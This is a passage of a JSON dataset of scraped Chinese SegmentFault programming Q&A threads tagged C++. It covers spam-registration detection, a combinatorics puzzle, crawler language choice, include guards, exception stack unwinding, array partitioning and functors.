{
  "cpp": [
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000209626\">\n<p>是啊别去考虑怎么验证是否随机了，基于既有算法作判断的话人家换一个算法不同的注册机你就判断不了了……</p>\n<p>还是想想如何在注册时增加必须手工操作无法AI代替的步骤吧……</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000242434\">\n<p>為何ip可以偽造?! server判斷是不是要改一下</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000209569\">\n<p>你要解决的问题是：「如何防止恶意注册？」</p>\n<p>1、无法判断一个字符串是否为随机。因为现在随机只是一个物理概念，而无法用数学的语言来定义。</p>\n<p>2、防止恶意注册用的最多的办法就是<strong>验证码</strong>。</p>\n</div>",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000209222\">\n<p>最近在处理一个问题的时候发现，有不少用户使用了发贴机或注册机来进行恶意注册。\n这些用户混淆在正常用户中间，cookie,ip均为伪造，没有更好的特征。</p>\n<p>经过观察，发现这些用户名一般都是随机生成，长度近似，但不知道是否有什么好的算法来识别一个字符串是否是随机生成的？</p>\n<p>求解。</p>\n</div>",
      "favourite": "1",
      "glance": "3.8k",
      "tags": [
        "c++",
        "c",
        "php",
        "字符串处理"
      ],
      "time": "2013-06-04",
      "title": "如何判断一个字符串是随机生成的而不是手写的？",
      "url": "https://segmentfault.com/q/1010000000209222"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000443987\">\n<p>每见一次花喝 1 斗，由于最开始有 2 斗，总共见了 10 次花，说明总共喝了 10 斗。所以因为遇见店而增加的酒为 8 斗。</p>\n<p>所以问题转化为把 8 拆成 5 个 2 的幂，也就是考虑每次遇见店增加多少斗。有两种：</p>\n<p>1 1 2 2 2<br>\n1 1 1 1 4</br></p>\n<p>但是没有 2 直接出现 4 是不可能的，所以只有 1 1 2 2 2 是可行的。</p>\n<p>所以问题转化为 1 1 2 2 2 这 5 个数有多少种排列方法，共 C(5,2) = 10 种。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000444186\">\n<p>这样的问题用枚举加剪枝的方式应该是可以接受的吧，下面我写的python代码：</p>\n<pre><code>#! /usr/bin/env python\n# *-* coding: utf-8 -*-\n\ndou = 2\ndian = 5\nhua = 10\nnum = 0\ndef walk(dou, dian, hua, path):\n    global num\n    if dou &lt; 0 or dian &lt; 0 or hua &lt; 0:\n        return\n    if dou == 1 and dian == 0  and hua == 1:\n        print path\n        num += 1\n    walk(dou+dou, dian-1, hua, path + ['dian']) #遇到店\n    walk(dou-1, dian, hua-1, path + ['hua']) # 遇到花\n\nwalk(dou, dian, hua, [])\nprint num\n</code></pre>\n<p>貌似楼主用C++，那个路径可以stack实现。补充一下运行结果（共14种）：</p>\n<pre><code>['dian', 'hua', 'dian', 'hua', 'hua', 'hua', 'hua', 'hua', 'dian', 'hua', 'dian', 'hua', 'dian', 'hua']\n['dian', 'hua', 'hua', 'dian', 'hua', 'hua', 'dian', 'hua', 'hua', 'hua', 'dian', 'hua', 'dian', 'hua']\n['dian', 'hua', 'hua', 'dian', 'hua', 'hua', 'hua', 'dian', 'dian', 'hua', 'hua', 'hua', 'dian', 'hua']\n['dian', 'hua', 'hua', 'dian', 'hua', 'hua', 'hua', 'dian', 'hua', 'dian', 'dian', 'hua', 'hua', 'hua']\n['dian', 'hua', 'hua', 'hua', 'dian', 'dian', 'hua', 'hua', 'dian', 'hua', 'hua', 'hua', 'dian', 'hua']\n['dian', 'hua', 'hua', 'hua', 'dian', 'dian', 'hua', 'hua', 'hua', 'dian', 'dian', 'hua', 'hua', 'hua']\n['dian', 'hua', 'hua', 'hua', 'dian', 'hua', 'dian', 'dian', 'hua', 'hua', 'dian', 'hua', 'hua', 'hua']\n['hua', 'dian', 'dian', 'hua', 'dian', 'hua', 'hua', 'hua', 'hua', 'hua', 'dian', 'hua', 'dian', 'hua']\n['hua', 'dian', 'dian', 'hua', 'hua', 'dian', 'hua', 'hua', 'dian', 'hua', 'hua', 'hua', 'dian', 'hua']\n['hua', 'dian', 'dian', 'hua', 'hua', 'dian', 'hua', 'hua', 'hua', 'dian', 'dian', 'hua', 'hua', 'hua']\n['hua', 'dian', 'dian', 'hua', 'hua', 'hua', 'dian', 'dian', 'hua', 'hua', 'dian', 'hua', 'hua', 'hua']\n['hua', 'dian', 'hua', 'dian', 'dian', 'hua', 'dian', 'hua', 'hua', 'hua', 'hua', 'hua', 'dian', 'hua']\n['hua', 'dian', 'hua', 'dian', 'dian', 'hua', 'hua', 'dian', 'hua', 'hua', 'dian', 'hua', 'hua', 'hua']\n['hua', 'dian', 'hua', 'dian', 'hua', 'dian', 'dian', 'hua', 'dian', 'hua', 'hua', 'hua', 'hua', 'hua']\n14\n</code></pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000444136\">\n<p>henix的思路非常好，只是这一句“所以问题转化为把 8 拆成 5 个 2 的幂”略有问题，漏掉了类似12311的组合（即漏掉了可能＋3的情形）。<br>\n加3斗的情况会在如下情境中触发：当前酒为2斗时候，遇店加至4斗，遇花喝掉一斗，此时有3斗，再遇店加3斗。所以这个组合中3必须紧挨着2，在2的后面，相当于\"23\"捆绑在一起。此种情况下有C(4,1) = 4种。总答案为C(5,2)＋C(4,1)为14种。</br></p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000443863\">\n<p>“李白街上走，提壶去买酒，遇店加一倍，见花喝一斗”，途中，遇见5次店，见了10此花，壶中原有2斗酒，最后刚好喝完酒，要求最后遇见的是花，求可能的情况有多少种？希望大家分享一下思路，谢谢！<br>\n我的思路很混乱，觉得直接暴力枚举能解决，但是枚举所有的情况比较不现实，希望大家解答啊!</br></p>\n</div>",
      "favourite": "8",
      "glance": "7.5k",
      "tags": [
        "c++",
        "编程",
        "算法"
      ],
      "time": "2014-03-24",
      "title": "李白喝酒问题的算法",
      "url": "https://segmentfault.com/q/1010000000443863"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000340530\">\n<p>推荐Python。有<a href=\"http://www.python-requests.org/en/latest/\">requests</a>等类库。<br/>\n也有<a href=\"http://scrapy.org/\">scrapy</a>这样的框架。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000340630\">\n<p>python 唯一的好处就是 request 库真的很方便</p>\n<p>我以前都是用 php 做爬虫的，现在都改用 python 了</p>\n<hr/>\n<p>其实用 JavaScript 也是很好的，node 或者 phantomJS</p>\n<p>因为很多时候你不仅要把 HTML 爬下来，还要解析；而 python 的 DOM 库简直糟糕透顶；比如 BeautifulSoup，很多操作就非常不方便；相比之下，js 进行 DOM 操作就方便多了</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000340556\">\n<p><a href=\"http://www.v2ex.com/t/62657\">参考</a></p>\n<p><a href=\"http://www.oschina.net/project/lang/21/c?tag=64\">C/C++ 网络爬虫</a></p>\n</div>",
      "attention": "7",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000340508\">\n<p>需要开发个采集腾讯、新浪微博的评论数据。<br/>\n如果直接使用官方提供的API，会有很多数据获取不到。所以可能得自己写了。<br/>\n我主要是想使用C++来开发的，其次才是PHP。在没办法的情况下，才会考虑使用python进行开发！<br/>\n网上大概了解了下，很多采集程序都是使用python来开发的。因为python的网络库很多，很丰富，开发起来方便快捷。<br/>\nPHP的也有个snoopy类库，C++的就不清楚了。<br/>\n不知道，C++中有没有这方面的爬虫类库推荐呢？</p>\n</div>",
      "favourite": "20",
      "glance": "10.3k",
      "tags": [
        "网页爬虫",
        "php",
        "c++",
        "mfc",
        "数据采集"
      ],
      "time": "2013-11-21",
      "title": "该选择哪个语言开发爬虫？",
      "url": "https://segmentfault.com/q/1010000000340508"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002716608\">\n<p>这个问题怎么都是负分... 有人来解释一下吗?</p>\n<p>我建议 CoffeeScript, 或者 ES6,<br>\n编写网页是编程人员必备技能, 稍微复杂点的网页就需要用到 JavaScript.<br>\n但是业界普遍认为 JavaScript 优点很多, 缺点比优点多得多,<br>\n所以推荐学习改进版的 CoffeeScript, 或者 ES6.</br></br></br></p>\n<p>教程:<br><a href=\"http://coffee-script.org\" rel=\"nofollow\">http://coffee-script.org</a><br><a href=\"http://javascript.ruanyifeng.com/advanced/ecmascript6.html\" rel=\"nofollow\">http://javascript.ruanyifeng.com/advanced/ecmascript6.html</a></br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002719604\">\n<p>你可以现在在线编程网站上试试，比如<a href=\"http://www.hubwiz.com\" rel=\"nofollow\">汇智网</a><a href=\"http://www.hubwiz.com\" rel=\"nofollow\">http://www.hubwiz.com</a>,感觉一下再说。上面有很多课程如c、python、js、nodejs、html、css等等。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002718341\">\n<p>Java C++学一个就好了，都很庞大，你不可能都学好。C和C++其实是不同的语言，不要混为一谈。<br>\n建议再学一门脚本语言（Python、Ruby）和一门函数式语言（Lisp、Scala、Clojure）<br>\n其中Scala和Clojure是基于JVM的，你的Java经验有点能用上。<br>\n我的建议是<br>\nPython-&gt;Java-&gt;c-&gt;Scala (按照这样的先后顺序学习）<br>\n语言学这么多就够了，其他的多学一些框架技术，用于真正的工作吧。</br></br></br></br></br></p>\n</div>",
      "attention": "25",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002716037\">\n<p>我要学习的编程语言有java、C\\C++<br>\n求大家还推荐一门编程语言  作为学校自修课程<br>\n谢谢了。</br></br></p>\n</div>",
      "favourite": "1",
      "glance": "2.1k",
      "tags": [
        "软件开发",
        "c++",
        "c",
        "java",
        "编程语言"
      ],
      "time": "2015-04-29",
      "title": "推荐学习哪门编程语言",
      "url": "https://segmentfault.com/q/1010000002716037"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000097472\">\n<p>这本应该够了:《C++Primer Plus 第5版》</p><p><a href=\"http://www.amazon.cn/C-Primer-Plus-%E7%AC%AC5%E7%89%88-%E4%B8%AD%E6%96%87%E7%89%88-%E6%99%AE%E6%8B%89%E5%A1%94/dp/B00116E71K/ref=sr_1_1?ie=UTF8&amp;qid=1321322432&amp;sr=8-1\" rel=\"nofollow\" target=\"_blank\" title=\"http://www.amazon.cn/C-Primer-Plus-%E...\">http://www.amazon.cn/C-Primer-Plus-%E...</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000097532\">\n<p>accelerated c++ 当时在学校图书馆借的<br/>\n你可以看看别人的看法<a href=\"http://blog.csdn.net/pongba/article/details/1930150\" rel=\"nofollow\" target=\"_blank\" title=\"http://blog.csdn.net/pongba/article/d...\">http://blog.csdn.net/pongba/article/d...</a></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000246978\">\n<p>传送门：<a href=\"http://justjavac.iteye.com/blog/1530097\" rel=\"nofollow\">一个合格的程序员应该读过哪些书</a></p>\n<h2>C++ 入门</h2>\n<p>一、<a href=\"http://126.am/BfyHN2\" rel=\"nofollow\">C++程序设计语言</a> - C++之父编写， 裘宗燕翻译。</p>\n<blockquote>\n<p>在C++语言和程序设计领域具有深远影响、畅销不衰的著作，由C++语言的设计者编写，对C++语言进行了最全面、最权威的论述，覆盖标准C++以及由C++所支持的关键性编程技术和设计技术。</p>\n</blockquote>\n<p>二、<a href=\"http://126.am/4WOAL3\" rel=\"nofollow\">C++编程思想</a> </p>\n<blockquote>\n<p>曾荣获美国《软件开发》杂志评选的1996年jolt生产力大奖，中文版自2000年推出以来，经久不衰，获得了读者的充分肯定和高度评价。</p>\n</blockquote>\n</div>",
      "attention": "8",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095137\">\n<p>麻烦大家推荐C++入门书籍或入门资料，不甚感激～</p>\n</div>",
      "favourite": "4",
      "glance": "5.7k",
      "tags": [
        "c++"
      ],
      "time": "2011-11-14",
      "title": "C++入门书籍",
      "url": "https://segmentfault.com/q/1010000000095137"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000373018\">\n<p><code>#include</code> 不仅可以包含h文件, 包含其他类型文件也是可以的.<br/>\n的确可以使得生成一个可执行文件包含同一个头文件多次, 我给题主举个拙劣的例子:</p>\n<p>foo.h:</p>\n<pre><code>a = 43;\n</code></pre>\n<p>foo.c:</p>\n<pre><code>static int foo(void)\n{\n    int a;\n#include \"foo.h\"\n    return a;\n}\n\nint main(void)\n{\n    int a;\n    int b;\n\n#include \"foo.h\"\n    b = foo();\n    printf(\"a is %d, b is %d\\n\", a, b);\n    return 0;\n}\n</code></pre>\n<p>假如预处理器自动让头文件只包含一次, 那么变量a将得不到初始化.<br/>\n在实际工程中还是可以见到把一些很庞大的数据放在一个文件, 然后 #include 这个文件的赋值给变量的.<br/>\n另外也有 include 一个 c 文件的例子, 例如 redis.</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000491258\">\n<p>还有一个作用，有些时候一个头文件会被其他头文件包含，比如<br>\ntypes.h 被header_a.h 和header_b.h包含，然后一个C文件同时包含header_a.h和header_b.h的时候，如果没有＃ifdef/#define/#endif，那么types.h就会被包含两次，这样在types.h中typedef unsigned int uint32_t;之列的声明也会在同一个c文件中出现2次，编译器会曝出redefinition of typedef 'foobar‘ 之类的warning或者错误。</br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000372876\">\n<p>1、C/C++ 的函数和变量都可以重复声明。条件判断是为了防止不必要的函数被声明，从而造成冲突。</p>\n<p>他是为了避免重复编译，而不是解决重复声明。</p>\n<p>2、<code>#pragma once</code> 同一个文件不会被编译多次。注意这里所说的 <strong>同一个文件</strong> 是指物理上的一个文件，而不是指内容相同的两个文件。</p>\n<p>C/C++ 没有 Java 那种每个类对应一个文件的规定，所以即使使用了 <code>#pragma once</code> 也应该在头文件里面加上条件判断。</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000372829\">\n<p>在C/C++中<code>#include</code>所包含的头文件里面必须显式声明</p>\n<pre><code>#ifndef __HEADER_H_DEFINE__\n#define __HEADER_H_DEFINE__\n\n#endif\n</code></pre>\n<p>或者有些编译器支持</p>\n<pre><code>#pragma once\n</code></pre>\n<p>编译器完全有能力在执行预处理指令<code>#include</code>时使同一个文件只包含一次，但是却没有这么做，为什么？是否有需要包含同一个文件超过一次的情况？</p>\n</div>",
      "favourite": "3",
      "glance": "3.3k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2013-12-30",
      "title": "为什么C/C++的预处理指令#include不自动让所包含的文件只包含一次？",
      "url": "https://segmentfault.com/q/1010000000372829"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002500608\">\n<p>在抛出异常后调用栈内存对象的析构函数，在C++标准里有规定。析构函数本来就不是显式调用的，编译器和运行环境自然知道什么时候应该调用析构函数，只要它们是按照C++标准实现的。至于如何实现，我想也不难吧，只需要给初始化过的对象做个标记，处理异常的时候逐个调用它们的析构函数不就好了。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002502478\">\n<p>引用维基百科的描述，讲的比我们解释的清楚，黑体是我加的：</p>\n<h2>throw</h2>\n<p>throw是一个C++关键字，与其后的操作数构成了throw语句，语法上类似于return语句。throw语句必须被包含在try块之中；可以是被包含在调用栈的外层函数的try中。</p>\n<p>执行throw语句时，其操作数的结果作为对象被复制构造为一个新的对象，放在内存的特殊位置（既不是堆也不是栈，Windows上是放在“线程信息块TIB”中）。这个新的对象由本级的try所对应的catch语句逐个做类型匹配；如果匹配不成功，则与本函数的外层catch语句依次做类型匹配；如果在本函数内不能与catch语句匹配成功，则递归回退到调用栈的上一层函数内从函数调用点开始继续与catch语句匹配。重复这一过程直到与某个catch语句匹配成功或者直到主函数main()都不能处理该异常。</p>\n<p><strong>因此，throw语句抛出的异常对象不同于一般的局部对象。一般的局部对象会在其作用域结束时被析构。而throw语句抛出的异常对象驻留在所有可能被激活的catch语句都能访问到的内存空间中。</strong></p>\n<p><strong>throw语句抛出的异常对象在匹配成功的catch语句的结束处被析构（即使该catch语句使用的是非“引用”的传值参数类型）。</strong></p>\n<p><strong>由于throw语句都进行了一次副本拷贝，因此异常对象应该是可以copy构造的。</strong>但对于Microsoft Visual C++编译器，异常对象的复制构造函数即使私有的情形，异常对象仍然可以被throw语句正常抛出；但在catch语句的参数是传值时，在catch语句处编译报错：</p>\n<pre><code>cannot be caught as the destructor and/or copy constructor are inaccessible”。\n</code></pre>\n<p>抛出一个表达式时，被抛出对象的静态编译时类型将决定异常对象的类型。</p>\n<h2>栈展开</h2>\n<p>栈展开（unwinding）是指当前的try...catch...块匹配成功或者匹配不成功异常对象后，从try块内异常对象的抛出位置，<strong>到try块的开始处的所有已经执行了各自构造函数的局部变量，按照构造生成顺序的逆序，依次被析构。</strong>如果当前函数内对抛出的异常对象匹配不成功，则从最外层的try语句到当前函数体的起始位置处的局部变量也依次被逆序析构，实现栈展开，然后再回退到调用栈的上一层函数内从函数调用点开始继续处理该异常。</p>\n<p>catch语句如果匹配异常对象成功，在完成了对catch语句的参数的初始化（对传值参数完成了参数对象的copy构造）之后，对同层级的try块执行栈展开。</p>\n<p>由于线程执行时，被调用的函数的参数、返回地址、局部变量等都是依函数调用次序保存在函数调用栈（即线程运行时栈）上。当前被调用函数的参数、局部变量名字可以覆盖掉早前调用函数的同名变量，看起来就是只有当前函数内的名字可以访问，早前调用的函数内部的名字都不可访问，就像磁带被“卷起”。<strong>异常处理时按照函数调用顺序的逆序析构，依次析构各个被调函数的局部变量，就类似把已经卷起的“磁带”再展开，抹去上面记录的数据，故此“栈展开”得名。</strong></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002502355\">\n<p>如何确保？<strong>标准</strong>确保。因为这是<strong>标准规定的</strong>。</p>\n<p>以下摘自 C++ 11 Standard (<a href=\"http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2013/n3690.pdf\" rel=\"nofollow\">draft N3690</a>)</p>\n<blockquote>\n<p>15.2 Constructors and destructors [except.ctor]</p>\n</blockquote>\n<p>不光保证了被析构，还规定了析构的顺序。</p>\n<blockquote>\n<p>1) As control passes from the point where an exception is thrown to a handler, <strong>destructors are invoked for all automatic objects constructed since the try block was entered. The automatic objects are destroyed in the reverse order of the completion of their construction.</strong></p>\n</blockquote>\n<p>比较特殊一点的，如果异常发生在构造或析构的时候，其<strong>子对象</strong>也能确保被正确的析构。而该对象本身呢？构造的时候它还不存在呢，所以无须担心。析构的情况会在后面说明。</p>\n<blockquote>\n<p>2) An object of any storage duration whose <strong>initialization or destruction is terminated by an exception will have destructors executed for all of its fully constructed subobjects</strong> (excluding the variant members of a union-like class), that is, for subobjects for which the principal constructor (12.6.2) has completed execution and the destructor has not yet begun execution. Similarly, if the non-delegating constructor for an object has completed execution and a delegating constructor for that object exits with an exception, <strong>the object’s destructor will be invoked</strong>. If the object was allocated in a new-expression, the matching deallocation function (3.7.4.2, 5.3.4, 12.5), if any, is called to free the storage occupied by the object.</p>\n</blockquote>\n<p>这整个过程被称为 \"stack unwinding\"，翻译过来叫: <strong>堆栈辗转开解</strong>。</p>\n<blockquote>\n<p>3) The process of calling destructors for automatic objects constructed on the path from a try block to the point where an exception is thrown is called <strong>“stack unwinding.”</strong> If a destructor called during stack unwinding exits with an exception, <code>std::terminate</code> is called (15.5.1). <strong>[Note: So destructors should generally catch exceptions and not let them propagate out of the destructor. —end note]</strong></p>\n</blockquote>\n<p>注意看那个 “Note”，标准对编译器做了要求，对于析构函数来说，是要对自身负责的。</p>\n<p>正是因为 stack unwinding 的保证作为基础，才有了我们所熟知的 <strong>RAII</strong> 技术。</p>\n<p>另外可以注意到，如果在 stack unwinding 期间抛出异常呢？就只能调用 <code>std::terminate</code> 了:</p>\n<blockquote>\n<p>15.5.1 The <code>std::terminate()</code> function [except.terminate]</p>\n</blockquote>\n<blockquote>\n<p>2) In such cases, <code>std::terminate()</code> is called (18.8.3). <strong>In the situation where no matching handler is found, it is implementation-deﬁned whether or not the stack is unwound before std::terminate() is called.</strong> In the situation where the search for a handler (15.3) encounters the outermost block of a function with a noexcept-speciﬁcation that does not allow the exception (15.4), it is implementation-deﬁned whether the stack is unwound, unwound partially, or not unwound at all before std::terminate() is called. In all other situations, the stack shall not be unwound before std::terminate() is called. An implementation is not permitted to ﬁnish stack unwinding prematurely based on a determination that the unwind process will eventually cause a call to std::terminate()</p>\n</blockquote>\n<p>stack unwinding 的过程并不保证做完，但最终肯定是要调用 <code>std::terminate</code> 来终止。</p>\n</div>",
      "attention": "7",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002498987\">\n<p>C++是如何确保出了异常还能调用析构函数的</p>\n</div>",
      "favourite": "1",
      "glance": "2.2k",
      "tags": [
        "c++"
      ],
      "time": "2015-01-20",
      "title": "为什么c++抛出异常后还能对函数内的局部对象进行析构？",
      "url": "https://segmentfault.com/q/1010000002498987"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000005746733\">\n<p>用链表还是很容易的吧，只是改变指针就可以了，遍历一次搞定，遇到偶数插入队尾（只改指针不申请内存），奇数就不管它，但如果还要对奇偶数各自排序基本不会有O(n)的算法</p>\n<pre><code>L = [1, 2, 3, 4, 5, 6]\nindex = 0\nfor _ in range(len(L)):\n    if L[index] % 2 == 1:\n        index += 1\n    else:\n        L.append(L.pop(index))\nprint(L)</code></pre>\n<pre><code>#include &lt;iostream&gt;\n#include &lt;list&gt; \n\nusing namespace std;\n\nint main() {\n    list&lt;int&gt; L;\n    int n = 3; \n    // 初始化链表\n    for(int i = 1; i &lt;= n * 2; i++)\n        L.push_back(i);\n    // 划分奇偶数\n    for(list&lt;int&gt;::iterator it = L.begin(); 0 &lt; n; ++it){\n        if(*it % 2 == 0){  // 如果是偶数\n            L.push_back(*it); // 插入尾节点 O(1)\n            L.erase(it); // 删除节点 O(1)\n            n -= 1;\n        }      \n    }\n    // 打印链表\n    for(list&lt;int&gt;::iterator it = L.begin(); it != L.end(); ++it)\n        cout &lt;&lt; *it &lt;&lt; ' ';\n    cout &lt;&lt; endl;\n        \n    return 0;\n}</code></pre>\n<p>已经很多人说了， 用链表是很容易实现的，但是用数组却不行（保持稳定性，时间O(n)，空间O(1)），如果谁可以，show your code，让我们膜拜你。</p>\n<p>初看无解的问题，貌似也有解决的办法的，待我整理一下。</p>\n<pre><code>def Foo(L):\n    # L = [0, 2, 4, 1, 3, 5]\n    length = len(L)\n    sk = max(*L, length) + 1# secret key\n    # 32位的话最多是支持4万多的数据量，且最大值也不超过46340\n    assert sk &lt; 46340, 'sk must be less than 46340' \n    li = 0                  # left index\n    ri = length - 1         # right index\n    uli = li                # unsorted left index\n    uri = ri                # unsorted right index\n    lli = length // 2 - 1   # left last index\n    rfi = lli + 1           # right first index\n    # 第一个循环先区别就位和未能就位的元素，同时将index信息加密到未能就位的元素数据中\n    # 这里用的加密文法是number = -(num + sk * indnx),将其变成一个负值\n    # 解密可以用index, num = divmod(abs(number), sk)来解密\n    while li &lt;= ri:\n        # 左边扫描到奇数\n        if L[li] % 2 == 1:\n            L[li], L[uli] = L[uli], L[li]\n            li += 1\n            uli += 1\n        # 右边扫描到偶数\n        elif L[ri] % 2 == 0:\n            L[ri], L[uri] = L[uri], L[ri]\n            ri -= 1\n            uri -= 1\n        # 当左为偶，且右为奇\n        else:\n            L[li], L[ri] = L[ri], L[li]\n            L[li] = -(L[li] + sk * lli) # 加密乱序的元素\n            lli -= 1\n            L[ri] = -(L[ri] + sk * rfi) # 加密乱序的元素\n            rfi += 1\n            li += 1\n            ri -= 1\n    print(L) # 加密后 [-39, -20, -1, -89, -70, -51]\n    # 解密\n    for i in range(uli, uri):\n        if L[i] &lt; 0:\n            index, number = divmod(abs(L[i]), sk)\n            next_num = L[index]\n            while next_num &lt; 0:                \n                L[index] = number\n                index, number = divmod(abs(next_num), sk)\n                next_num = L[index]\n    print(L) # 解密 [1, 3, 5, 0, 2, 4]\n    return L</code></pre>\n<p><strong>最好不要用大于length数字来测试</strong>，如果数据不大的话，应该没问题的，否则就要考虑溢出的问题了。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000005745919\">\n<p>我是這樣想拉，不知道你覺得怎麼樣:</p>\n<p>就從數組的頭開始走，碰到奇數不動，碰到偶數就把它放到數組的最後，直到搬動了 n 個偶數為止。</p>\n<pre><code>1. 奇數偶數各自順序不變\n2. 只需要一個整數記目前搬動幾個了\n3. 就最差 2n 步(偶數都在後面的情況)</code></pre>\n<hr>\n<p>P.S. 為什麼給負分呢? 如果覺得答案有任何不妥的地方，可以先評論、討論之後再給別人負分，我不覺得有必要踩在這裡認真討論的人，對於負分充滿著疑惑...</p>\n</hr></div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000005746481\">\n<p>在你的3个条件限制下，数组不行，链表可以。</p>\n</div>",
      "attention": "28",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005744068\">\n<p>给定一个2n长数组，其中n个奇数和n个偶数，对数组进行排序将奇数放在前半部分，偶数放在后半部分。要求：</p>\n<ol>\n<li><p>不改变原来的奇偶各自的相对顺序</p></li>\n<li><p>只申请常数的空间</p></li>\n<li><p>时间复杂度为O(n)</p></li>\n</ol>\n<p>举例：给出1 2 3 4 5 6<br>排序后为 1 3 5 2 4 6</br></p>\n<p>PS：请一定仔细阅读3个条件，去掉其中任意一个都变得简单，并且网上我搜到的答案都是缺少其中某个条件的。因此我怀疑这题是否有解。</p>\n<hr>\n<p>看了大家的回答，基本可以分为2种情况：</p>\n<ol>\n<li><p>用链表可以轻易解决这道题，当然如果把数组转成链表因为需要申请2n长度的next数组，所以认为还是申请额外空间了</p></li>\n<li><p>只管输出，如果只要求输出结果那遍历2遍就行了，但这样题目变得太过简单</p></li>\n</ol>\n<p>因为这是一道面试题，我想可以从上面2方面和面试官沟通，我只是凭记忆写下这题，其中也许有自己的一些思维定势（比如没有强调一定是数组，或者没有强调必须要求数组排序只要求输出）。看了大家的讨论还是很有启发的。</p>\n<hr>\n<p>找到了国外的链接，看了一圈讨论大部分认为没有O(n)时间O(1)空间的解法<br><a href=\"https://www.careercup.com/question?id=5201559730257920\">https://www.careercup.com/question?id=5201559730257920</a></br></p>\n<hr>\n<p>另外说下我自己对这题的一个思考，可以观察到，假如一个数组是符合最终条件的，那么发现当且仅当只交换相邻的两个奇偶数是不会破坏相对顺序的，那么只需给出一个策略找出从最终状态转到题目起始状态的就行了。<br>另外，不要纠结于奇偶分别的大小问题，比如4 5 3 1 2 6和2 1 3 5 4 6是等价的，只是一个简单的替换，只要将奇数按1 3 5……这样的顺序，偶数按2 4 6……这样的顺序排好就行了。</br></p>\n</hr></hr></hr></div>",
      "favourite": "7",
      "glance": "1.4k",
      "tags": [
        "c++",
        "c",
        "python",
        "算法"
      ],
      "time": "6-17",
      "title": "给定一个2n长的数组将奇数放在偶数前面",
      "url": "https://segmentfault.com/q/1010000005744068"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002647664\">\n<p>这个struct其实是functor，国内译成仿函数，它的好处是可以保存状态。</p>\n<p>我举个例子，你现在用compare_nocase的函数指针作为参数，假如突然又有一个地方要求你比较字符串，但此时要求你忽略首字母，从第二个字符串开始比较，那么你应该怎么做？</p>\n<p>1.要么你重新写一个compare_nocase2函数，但会造成大量重复代码。<br>\n2.要么你弄个int start变量，然后放在compare_nocase的外面，在执行我刚才说的这个需求时候，先改变start=2，执行完以后再把全局变量改回去。</br></p>\n<p>可以看到，都不优雅。<br>\n或许你想到了把compare_nocase写到一个类里，但这必须要是static method。</br></p>\n<p>而functor的解决很简单。</p>\n<pre><code>cpp</code><code>struct mylistSort {\n  int start;\n  mylistSort(int p) { start = p; }\n  bool operator() (string first, string second) const {\n    int i=start-1;\n    while ( (i&lt;first.length()) &amp;&amp; (i&lt;second.length()) ) {\n      if (tolower(first[i])&lt;tolower(second[i])) return true;\n      ++i;\n    }\n    if (first.length()&lt;second.length()) return true;\n    else return false;\n  }\n};\n</code></pre>\n<p>这样你从首字符开始比较就可以mylist.sort(mylistSort(1));而当你需要忽略首字符，从第二个字母开始比较的时候就可以mylist.sort(mylistSort(2));</p>\n<p>这样就轻松避免了全局变量的状态管理。</p>\n<p>事实上functor还有很多其他好处，特别是配合template来写，会发挥很大作用！</p>\n<p>对了，C++11的话，可以这样写</p>\n<pre><code>cpp</code><code>mylist.sort([](string first, string second) {\n          // 比较逻辑\n           });\n</code></pre>\n<p>C++14的话还能把它改成auto~~</p>\n</div>",
